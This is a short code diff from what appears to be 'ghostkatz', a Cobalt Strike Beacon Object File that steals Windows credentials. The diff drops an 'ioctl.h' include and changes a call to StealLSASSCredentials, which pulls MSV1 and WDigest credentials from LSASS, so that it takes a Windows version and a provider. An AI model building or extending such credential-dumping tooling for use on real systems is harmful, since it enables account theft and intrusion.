@@ -2,7 +2,6 @@
 
 #include "beacon.h"
 #include "defs.h"
-#include "ioctl.h"
 #include "provider.h"
 #include "ghostkatz.h"
 
@@ -157,7 +156,7 @@ int go(char *args, int argLen)
     }
 
 
-    if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
+    if (!StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials, provider))
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
     }
